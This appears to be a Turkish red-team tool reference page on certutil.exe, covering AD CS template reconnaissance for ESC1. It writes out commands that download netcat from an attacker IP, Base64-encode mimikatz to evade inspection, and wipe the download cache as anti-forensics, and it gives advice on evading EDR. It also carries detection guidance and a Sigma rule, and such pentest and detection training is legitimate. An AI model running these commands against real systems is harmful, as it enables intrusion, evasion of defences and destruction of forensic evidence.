# certutil

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Sertifika Hizmetleri LOLBin aracı; AD CS şablon ve CA keşfi (`-ca.info`, `-catemplates`), uzaktan dosya indirme (`-urlcache -split -f`), Base64 kodlama/çözme (`-encode`/`-decode`) ve dosya hashleme (`-hashfile`).

---

## 1. Genel Bakış ve Amaç

`certutil.exe`, Windows işletim sistemlerinde varsayılan olarak (`C:\Windows\System32\certutil.exe`) bulunan ve **Active Directory Sertifika Hizmetleri (AD CS)** ile yerel Sertifika Deposu'nu (Certificate Store) yönetmek amacıyla tasarlanmış yerleşik bir komut satırı aracıdır. 

Red Team operasyonlarında ve Active Directory sızma testlerinde `certutil.exe`, iki kritik alanda vazgeçilmez bir **LOLBin (Living Off the Land Binary)** olarak öne çıkar:
1. **AD CS Keşfi ve İstismarı (ESC Zafiyetleri):** Etki alanındaki Sertifika Yetkililerini (Certificate Authority - CA), yayınlanan şablonları (`Certificate Templates`), kayıt izinlerini ve bayrakları (ESC1-ESC8 analizi) harici araç gerekmeksizin doğrudan sorgulamak.
2. **Araç Transferi ve Savunma Atlatma (Tool Transfer & Obfuscation):** Uzak bir HTTP/HTTPS sunucusundan dosya/payload indirmek (`Ingress Tool Transfer`), Base64/Hex kodlama ve çözme ile antivirüs/EDR statik analizlerini atlatmak.

### Protokol ve Çalışma Prensibi

`certutil`, yerine getirdiği işleve göre iki farklı ağ ve işletim sistemi mimarisiyle çalışır:

```
┌────────────────────────────────────────────────────────────────────────┐
│                        Uç Nokta (İstemci)                              │
│                         [ certutil.exe ]                               │
└───────────────────┬────────────────────────────────┬───────────────────┘
                    │                                │
    (A) AD CS Keşfi │                (B) Dosya İndirme│ [Cryptnet.dll / WinINet]
        [MSRPC/DCOM]│                    [HTTP/HTTPS]│ User-Agent: "CertUtil URL Agent"
                    ▼                                ▼
┌──────────────────────────────────────┐   ┌─────────────────────────────┐
│    Sertifika Yetkilisi (CA / DC)     │   │     Saldırgan Sunucusu      │
│     [ Active Directory CS ]          │   │      (HTTP / C2 Server)     │
│                                      │   │                             │
│ - CA Genel Bilgisi (-ca.info)        │   │ - İkili Dosya / Stager      │
│ - Aktif Şablonlar (-catemplates)     │   │ - Base64 Payload            │
│ - EKU ve Subject İzinleri            │   │                             │
└──────────────────────────────────────┘   └─────────────────────────────┘
```

1. **AD CS Keşif Akışı:** `certutil -ca.info` veya `certutil -catemplates` çalıştırıldığında, istemci etki alanı denetleyicisi ve CA sunucusu ile MSRPC (ICertRequestD / DCOM) ve LDAP (TCP 389) üzerinden haberleşir. CA konfigürasyonunu ve şablon niteliklerini (Client Authentication EKU, `ENROLLEE_SUPPLIES_SUBJECT` vb.) çeker.
2. **Dosya Transferi Akışı:** `certutil -urlcache -split -f <URL> <Dosya>` çalıştırıldığında, Windows'un kriptografik ağ bileşeni olan `Cryptnet.dll` ve WinINet API'leri devreye girer. HTTP `GET` isteği oluşturulur, dosya yerel diske yazılırken bir kopyası da Windows'un gizli önbellek dizinine (`CryptnetUrlCache`) kaydedilir.
3. **Base64 Dönüştürme:** `-encode` ve `-decode` bayrakları Windows CryptoAPI üzerinden çalışarak ikili dosyaları PEM/Base64 metinlerine veya tersine dönüştürür; böylece EDR'ların disk yazma imzaları atlatılabilir.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **AD CS Zafiyet Tespiti (ESC1-ESC8)** | CA sunucusunu, zafiyetli şablonları ve istemci kimlik doğrulama bayraklarını sıfır dosya ile haritalama. |
| **LOLBin Dosya İndirici (Stager)** | PowerShell kısıtlı dil modunda (CLM) veya curl/wget bulunmayan eski Windows'larda dosya indirme. |
| **Statik Analiz Atlatma (Deobfuscation)** | Zararlı ikili dosyaları Base64 formatında sunucuya taşıyıp uç noktada `-decode` ile çalıştırma. |
| **Bütünlük Kontrolü (Hash Doğrulama)** | İndirilen veya derlenen payload'ların SHA256/MD5 hash değerlerini doğrulama (`-hashfile`). |
| **Sertifika ve Anahtar Dökümü** | Yerel sertifika depolarındaki (MY, ROOT, CA) özel anahtarları ve sertifika zincirlerini inceleme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `certutil.exe` | `Certipy (Python)` | `Invoke-WebRequest (PS)` | `bitsadmin.exe` |
|---|---|---|---|---|
| **Varsayılan Bulunabilirlik** | Tüm Windows sürümlerinde hazır | Harici Linux aracı | Windows 7+ PowerShell | Windows 7+ LOLBin |
| **AD CS Şablon Analizi** | Var (Temel/Orta) | Çok Yüksek (Otomatik ESC Analizi) | Yok (Script gerektirir) | Yok |
| **Dosya İndirme Yeteneği** | Var (`-urlcache -split`) | Yok | Var (`iwr`) | Var (`/transfer`) |
| **EDR / AV İmzası** | Komut satırı argümanı yüksek risklidir | Windows uç noktada iz bırakmaz | Script Block Logging (EID 4104) | Komut satırı izlenir |
| **Ağ İzi (User-Agent)** | `CertUtil URL Agent` (Tanımlı) | N/A | `Mozilla/5.0... (PowerShell)` | BITS Protokol İmzası |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
certutil [seçenekler] [argümanlar]
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-urlcache` | URL önbellek girdilerini görüntüler veya siler. | `certutil -urlcache * delete` |
| `-split` | Dosyayı bölünmüş parçalar halinde indirmeyi sağlar (Dosya indirmede zorunludur). | `certutil -urlcache -split -f http://site/a.exe a.exe` |
| `-f` | Hedef dosya yerelde mevcutsa üzerine yazmayı zorlar (Force). | `certutil -urlcache -split -f http://site/a.exe a.exe` |
| `-encode` | Belirtilen ikili dosyayı Base64 PEM formatına kodlar. | `certutil -encode payload.exe encoded.txt` |
| `-decode` | Base64 formatındaki metin dosyasını ikili dosyaya geri çözer. | `certutil -decode encoded.txt payload.exe` |
| `-encodehex` / `-decodehex` | Dosyaları onaltılık (Hex) formata kodlar veya çözer. | `certutil -decodehex hex.txt payload.exe` |
| `-hashfile <dosya> <algoritma>`| Dosyanın kriptografik hash'ini hesaplar (`MD5`, `SHA1`, `SHA256`). | `certutil -hashfile beacon.exe SHA256` |
| `-ca.info` | Etki alanındaki Sertifika Yetkilisinin (CA) yapılandırma özetini gösterir. | `certutil -ca.info` |
| `-catemplates` | CA tarafından yayınlanan etkin sertifika şablonlarını listeler. | `certutil -catemplates` |
| `-template <şablon_adı>` | Belirtilen sertifika şablonunun politikalarını, OID'lerini ve izinlerini döker. | `certutil -v -template UserAuth` |
| `-ping` | CA sunucusuna Active Directory üzerinden RPC ping isteği gönderir. | `certutil -ping` |
| `-store <depo>` | Belirtilen Windows sertifika deposundaki sertifikaları döker (`My`, `Root`, `CA`). | `certutil -store My` |
| `-exportPFX <depo> <indeks> <dosya>` | Sertifika deposundaki sertifikayı ve özel anahtarını PFX olarak dışa aktarır. | `certutil -exportPFX My 1 cert.pfx` |

### Modül ve Yetenek Ağacı

```
certutil.exe Yetenek Ağacı
├── 1. AD CS Keşif ve Tanı
│   ├── certutil -ca.info             (CA mimarisi ve yapılandırması)
│   ├── certutil -catemplates         (Yayınlanan sertifika şablonları)
│   ├── certutil -v -template <ad>    (Şablon izinleri ve EKU analizi)
│   └── certutil -ping                (CA RPC erişim testi)
├── 2. Dosya Transferi (Ingress Tool Transfer)
│   ├── certutil -urlcache -split -f  (Uzak HTTP/HTTPS indirme)
│   └── certutil -urlcache * delete   (İndirme önbelleğini temizleme)
├── 3. Savunma Atlatma & Kodlama
│   ├── certutil -encode              (Binary -> Base64 metin)
│   ├── certutil -decode              (Base64 metin -> Binary)
│   └── certutil -decodehex           (Hex metin -> Binary)
└── 4. Kriptografik Doğrulama
    ├── certutil -hashfile <dosya>    (MD5, SHA1, SHA256 hesaplama)
    └── certutil -store <depo>        (Windows sertifika depoları)
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: AD CS Keşfi — Aktif Sertifika Yetkililerini ve Zafiyetli Şablonları Haritalama

Etki alanında Active Directory Certificate Services (AD CS) bulunup bulunmadığını ve CA adını öğrenmek:

```cmd
certutil -ca.info
```

**Örnek Çıktı Analizi:**
```text
Config: LAB-DC01-CA\lab-DC01-CA
Common Name: lab-DC01-CA
Computer Name: DC01.lab.local
Sanitized Name: lab-DC01-CA
Server DNS Name: DC01.lab.local
Flags: 0x1 -> CA_FLAG_ACTIVE
The command completed successfully.
```

CA tarafından kullanıma sunulan tüm aktif sertifika şablonlarını listelemek:
```cmd
certutil -catemplates
```

**Örnek Çıktı:**
```text
Administrator: Administrator -- Enrollment Flags: 0x0
User: User -- Enrollment Flags: 0x0
WebServer: Web Server -- Enrollment Flags: 0x0
SmartcardLogon: Smartcard Logon -- Enrollment Flags: 0x0
ESC1_Vulnerable_Template: Custom User Auth -- Enrollment Flags: 0x20
The command completed successfully.
```
- `ESC1_Vulnerable_Template`: Şablonun özel bir kayıt bayrağına (`Enrollment Flags: 0x20`) sahip olduğu görülüyor; bu şablon ayrıntılı incelenmelidir.

---

### Senaryo 2: Sertifika Şablonu Detaylarını İnceleme (ESC1 Zafiyet Analizi)

Şablonun hangi EKU (Extended Key Usage) değerlerine sahip olduğunu ve kullanıcının sertifika talebinde başka bir kullanıcının kimliğini (SAN - Subject Alternative Name) belirtip belirtemeyeceğini incelemek:

```cmd
certutil -v -template ESC1_Vulnerable_Template
```

**Örnek Çıktı Analizi:**
```text
Template: ESC1_Vulnerable_Template (Custom User Auth)
  msPKI-Certificate-Name-Flag: 0x1 -> CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
  msPKI-Enrollment-Flag: 0x0
  msPKI-Private-Key-Flag: 0x10
  pKIExtendedKeyUsage:
    1.3.6.1.5.5.7.3.2 -- Client Authentication
The command completed successfully.
```
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`: Bu bayrak **ESC1** zafiyetinin kesin kanıtıdır! Düşük yetkili bir kullanıcı, sertifika talep ederken içine `administrator@lab.local` SAN kimliğini ekleyebilir ve CA bu sertifikayı onaylar.
- `Client Authentication (1.3.6.1.5.5.7.3.2)`: Üretilen sertifikanın Kerberos PKINIT üzerinden etki alanı kimlik doğrulaması (TGT talebi) için kullanılabileceğini doğrular.

---

### Senaryo 3: LOLBin Dosya İndirme (Ingress Tool Transfer)

Saldırgan ele geçirdiği sisteme C2 ajanını veya bir yardımcı aracı uzaktan indirmek ister:

```cmd
certutil -urlcache -split -f http://10.10.10.5/nc64.exe C:\Windows\Temp\nc64.exe
```

**Örnek Çıktı Analizi:**
```text
****  Online  ****
  000000  ...
  00a000  ...
  010000
CertUtil: -urlcache command completed successfully.
```
- `-urlcache`: URL üzerinden dosya çekme motorunu başlatır.
- `-split`: İndirilen verinin yerel diske kaydedilmesini sağlar.
- `-f`: Belirtilen dosya hedefte varsa üzerine yazılmasını zorlar.

---

### Senaryo 4: İndirme Önbelleğini (CryptnetUrlCache) Temizleme (Anti-Forensics)

`certutil` ile dosya indirildiğinde arkasında bıraktığı en tehlikeli adli iz Windows önbelleğidir. Bu izleri derhal temizlemek gerekir:

```cmd
certutil -urlcache * delete
```

**Örnek Çıktı:**
```text
http://10.10.10.5/nc64.exe: Deleted from cache
CertUtil: -urlcache command completed successfully.
```

---

### Senaryo 5: Savunma Atlatma — Base64 Kodlama ve Çözme

Ağ güvenlik cihazlarını (Firewall/IDS) atlatmak için ikili dosya saldırgan makinesinde Base64 metnine dönüştürülür:

```cmd
:: Saldırgan makinesinde kodlama:
certutil -encode mimikatz.exe mimi.txt
```

Hedef sistemde dosya indirildikten sonra tekrar ikili dosyaya geri dönüştürülür:
```cmd
certutil -decode mimi.txt C:\Windows\Temp\mimi.exe
```

---

### Senaryo 6: Dosya Bütünlüğü ve Hash Kontrolü

İndirilen bir aracın bozulup bozulmadığını veya savunma sistemleri tarafından manipüle edilip edilmediğini doğrulamak:

```cmd
certutil -hashfile C:\Windows\Temp\nc64.exe SHA256
```

**Örnek Çıktı:**
```text
SHA256 hash of C:\Windows\Temp\nc64.exe:
5b2721f574d618d36357dd58a2d3c909618f43c3d528b9fb6b15ec74668b209e
CertUtil: -hashfile command completed successfully.
```

---

### Senaryo 7: PowerShell ile certutil Çıktısını Parse Edip İstemci Kimlik Doğrulamalı Şablonları Bulan Betik

Etki alanındaki tüm sertifika şablonlarını tarayıp zafiyetli şablonları listeleyen operasyonel PowerShell tek satırlığı:

```powershell
# CA Şablonlarını sorgulayıp Client Authentication içerenleri filtreleme:
$Templates = (certutil -catemplates | Select-String '^\s*([^:\s]+):' | ForEach-Object { $_.Matches.Groups[1].Value })
foreach ($tmpl in $Templates) {
    $detail = certutil -v -template $tmpl 2>$null | Out-String
    if ($detail -match '1.3.6.1.5.5.7.3.2' -and $detail -match 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT') {
        Write-Host "[!] KRITIK ZAFİYET (ESC1): $tmpl" -ForegroundColor Red
    } elseif ($detail -match '1.3.6.1.5.5.7.3.2') {
        Write-Host "[+] İstemci Doğrulama Şablonu: $tmpl" -ForegroundColor Green
    }
}
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kodu | Olası Neden | Çözüm Adımı |
|---|---|---|
| `CertUtil: -urlcache command FAILED: 0x80072ee7 (WIN32: 12007 ERROR_INTERNET_NAME_NOT_RESOLVED)` | İndirme URL'sindeki alan adı (domain) DNS tarafından çözülemiyor. | URL içerisinde alan adı yerine doğrudan saldırgan sunucusunun IP adresini kullanın (`http://10.10.10.5/...`). |
| `CertUtil: -urlcache command FAILED: 0x80070005 (WIN32: 5 ERROR_ACCESS_DENIED)` | Hedef çıktı dosya yoluna yazma izni yoktur (`C:\Windows\System32` gibi korumalı dizinler). | Çıktı dosya yolunu yazılabilir bir dizine yönlendirin: `C:\Windows\Temp` veya `%TEMP%`. |
| `CertUtil: -template command FAILED: 0x80070002 (WIN32: 2 ERROR_FILE_NOT_FOUND)` | Belirtilen şablon adı CA üzerinde mevcut değildir veya yazım hatası yapılmıştır. | Şablon adlarını `certutil -catemplates` çıktısından birebir kopyalayarak yeniden deneyin. |
| `CertUtil: -ping command FAILED: 0x800706ba (RPC_S_SERVER_UNAVAILABLE)` | CA sunucusunda Sertifika Hizmetleri kapalıdır veya güvenlik duvarı RPC (TCP 135 / Dinamik Portlar) trafiğini engellemektedir. | Ağ bağlantısını test edin; CA sunucusunun IP adresine TCP 135 üzerinden erişilip erişilemediğini `Test-NetConnection` ile doğrulayın. |
| `CertUtil: -decode command FAILED: 0x80070057 (WIN32: 87 ERROR_INVALID_PARAMETER)` | Çözülmek istenen dosya geçerli bir Base64 PEM başlığı (`-----BEGIN CERTIFICATE-----`) içermemektedir. | Dosyanın başında ve sonunda standart PEM başlıklarının veya temiz Base64 karakterlerinin olduğundan emin olun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Windows Güvenlik Olay Günlükleri:**
  - **Event ID 4688 (Process Creation):** Süreç oluşturma günlüğünde `Image: certutil.exe` ve `CommandLine` argümanları (`-urlcache`, `-split`, `-decode`, `-encode`) kaydedilir.
  - **Event ID 4886 / 4887 (Certificate Services Events):** CA sunucusunda sertifika talep edildiğinde veya onaylandığında talep eden kullanıcı ve şablon adı kaydedilir.
- **Sysmon Olay Günlükleri:**
  - **Sysmon Event ID 1 (Process Creation):** `certutil.exe` çalıştırılması tüm argümanlarıyla doğrudan yakalanır.
  - **Sysmon Event ID 11 (File Create):** Dosya indirme işlemi sonucunda hedef dizinde ve gizli önbellek klasöründe yeni dosya oluşturulur.
  - **Sysmon Event ID 22 (DNS Query):** Eğer URL'de domain kullanılmışsa DNS çözümleme kaydı oluşur.
- **Disk Kalıntıları (CryptnetUrlCache):**
  - `certutil -urlcache` kullanıldığında indirilen dosyanın meta verileri ve içeriği şu gizli dizinlere yazılır:
    - `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData`
    - `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
  - Bu dosyalar adli bilişim (DFIR) analizinde saldırganın indirdiği zararlının orijinal URL ve zaman damgasını kesin olarak kanıtlar.

### 5.2 Ağ ve EDR İmzaları

- **Karakteristik User-Agent İmzası:** `certutil` ile yapılan tüm HTTP/HTTPS isteklerinde varsayılan olarak şu başlık gönderilir:
  ```http
  User-Agent: Microsoft-CryptoAPI/10.0
  ```
  veya
  ```http
  User-Agent: CertUtil URL Agent
  ```
  Bu başlık, kurumsal proxy ve IDS/IPS (Suricata/Snort) sistemleri tarafından doğrudan **Suspicious Ingress Tool Transfer** olarak algılanır.
- **EDR Komut Satırı Tespiti:** `certutil.exe -urlcache` veya `certutil.exe -decode` kalıpları, istisnasız tüm modern EDR'larda (Defender for Endpoint, CrowdStrike, SentinelOne) **Yüksek / Kritik Tehdit** olarak işaretlenir ve süreç genellikle sonlandırılır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1105** | Ingress Tool Transfer | Uzak sunucudan payload veya yardımcı araç indirme (`-urlcache -split -f`). |
| **T1140** | Deobfuscate/Decode Files or Information | Base64/Hex formatındaki zararlıyı disk üzerinde çalıştırma formatına çözme (`-decode`). |
| **T1027** | Obfuscated Files or Information | Dosyaları Base64 metnine dönüştürerek gizleme (`-encode`). |
| **T1649** | Steal or Forge Authentication Certificates | AD CS mimarisini, zafiyetli şablonları ve sertifika depolarını haritalama (`-ca.info`, `-catemplates`). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **`certutil -urlcache` EDR Alarmı** | `certutil` ile dosya indirmek yerine, bellekte çalışan .NET assembly'leri, BITS (`bitsadmin` / PowerShell BITS) veya doğrudan `[System.Net.HttpWebRequest]` bellek içi stream'leri kullanın. |
| **Cryptnet Önbellek İzi** | Komut biter bitmez derhal `certutil -urlcache * delete` çalıştırın veya ilgili AppData dizinini güvenli şekilde silin. |
| **User-Agent İmzası** | Web sunucunuzda (C2/Attacker) gelen `CertUtil URL Agent` isteklerini meşru bir 404 sayfasına yönlendirerek Blue Team'in sahte analiz yapmasını sağlayın. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Ağ Seviyesinde User-Agent Engelleme:** Web Proxy ve Güvenlik Duvarlarında `User-Agent: CertUtil URL Agent` veya `Microsoft-CryptoAPI` içeren internete doğru dış bağlantıları engelleyin veya alarm üretin.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Ingress Tool Transfer or Decode via Certutil
  status: critical
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith: '\certutil.exe'
          CommandLine|contains:
              - '-urlcache'
              - '-split'
              - '-decode'
              - '-decodehex'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 Uzak Sunucudan Payload İndirme
```cmd
certutil -urlcache -split -f http://10.10.10.5/nc64.exe C:\Windows\Temp\nc64.exe
```
- **Ne Yapar?** Belirtilen uzak URL'den dosyayı indirir ve hedef dizine kaydeder.
- **Ne Zaman Kullanılır?** Harici indirme araçları bulunmadığında hızlıca sisteme araç aktarmak için.
- **Parametreler:** `-urlcache` (URL modülü), `-split` (Transferi böler ve kaydeder), `-f` (Üzerine yazmayı zorlar).

### 6.2 URL Önbellek İzlerini Temizleme
```cmd
certutil -urlcache * delete
```
- **Ne Yapar?** `certutil` tarafından indirilen dosyaların Windows önbelleğinde kalan meta verilerini ve içerik kalıntılarını siler.
- **Ne Zaman Kullanılır?** Dosya indirme operasyonunun hemen ardından adli bilişim (forensics) izlerini temizlemek için.
- **Parametreler:** `* delete` (Tüm önbellek girdilerini siler).

### 6.3 İkili Dosyayı Base64 Metnine Dönüştürme
```cmd
certutil -encode mimikatz.exe mimi.txt
```
- **Ne Yapar?** İkili dosyayı Base64 PEM formatında bir metin dosyasına çevirir.
- **Ne Zaman Kullanılır?** Dosyayı e-posta, metin tabanlı komut kabuğu veya içerik denetimli kanallardan sızdırmak/taşımak için.
- **Parametreler:** `-encode` (Base64 kodlama komutu).

### 6.4 Base64 Metnini İkili Dosyaya Çözme
```cmd
certutil -decode mimi.txt C:\Windows\Temp\mimi.exe
```
- **Ne Yapar?** Base64 metin dosyasını orijinal ikili (EXE/DLL) formatına geri döndürür.
- **Ne Zaman Kullanılır?** Sisteme metin olarak sokulan zararlı yazılımı çalıştırmadan önce çalıştırılabilir formata getirmek için.
- **Parametreler:** `-decode` (Base64 çözme komutu).

### 6.5 Dosyanın SHA-256 Hash Değerini Hesaplama
```cmd
certutil -hashfile C:\Windows\Temp\nc64.exe SHA256
```
- **Ne Yapar?** Belirtilen dosyanın SHA-256 kriptografik özetini hesaplar.
- **Ne Zaman Kullanılır?** İndirilen payload bütünlüğünü veya EDR tarafından değiştirilip değiştirilmediğini doğrulamak için.
- **Parametreler:** `-hashfile` (Hash hesaplama), `SHA256` (Algoritma).

### 6.6 Kurumsal Sertifika Yetkilisini (CA) Sorgulama
```cmd
certutil -ca.info
```
- **Ne Yapar?** Etki alanındaki aktif Sertifika Yetkilisinin adını, sunucu DNS adını ve çalışma durumunu listeler.
- **Ne Zaman Kullanılır?** AD CS zafiyet araştırmasının ilk adımında CA sunucusunun varlığını tespit etmek için.
- **Parametreler:** `-ca.info`.

### 6.7 CA Tarafından Yayınlanan Aktif Sertifika Şablonlarını Listeleme
```cmd
certutil -catemplates
```
- **Ne Yapar?** CA sunucusu tarafından kullanıcıların kayıt olmasına izin verilen tüm aktif sertifika şablonlarını listeler.
- **Ne Zaman Kullanılır?** Zafiyetli (ESC1, ESC2, ESC3, ESC4) şablon avı öncesinde şablon envanteri çıkarmak için.
- **Parametreler:** `-catemplates`.

### 6.8 Belirli Bir Sertifika Şablonunun Ayrıntılarını ve EKU Değerlerini İnceleme
```cmd
certutil -v -template UserAuth
```
- **Ne Yapar?** Şablonun `msPKI-Certificate-Name-Flag` ve `ExtendedKeyUsage` (EKU) bayraklarını ayrıntılı döker.
- **Ne Zaman Kullanılır?** Şablonun `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ve `Client Authentication` içerip içermediğini doğrulamak için.
- **Parametreler:** `-v` (Verbose / ayrıntılı çıktı), `-template <Ad>` (İncelenecek şablon).

### 6.9 CA Sunucusuna RPC Bağlantı Testi Yapma
```cmd
certutil -ping
```
- **Ne Yapar?** İstemcinin etki alanı denetleyicisi ve CA sunucusu ile RPC protokolü üzerinden canlı iletişimini test eder.
- **Ne Zaman Kullanılır?** Sertifika talebi göndermeden önce ağ iletişim hatlarını doğrulamak için.
- **Parametreler:** `-ping`.

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — certutil command reference | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) |
| LOLBAS Project — certutil.exe | [lolbas-project.github.io](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) |
| SpecterOps — Certified Pre-Owned (AD CS Whitepaper) | [specterops.io](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) |
| MITRE ATT&CK T1105 (Ingress Tool Transfer) | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |

---

> **Önceki:** [← klist](./klist.md) · **Sonraki:** [whoami →](./whoami.md)
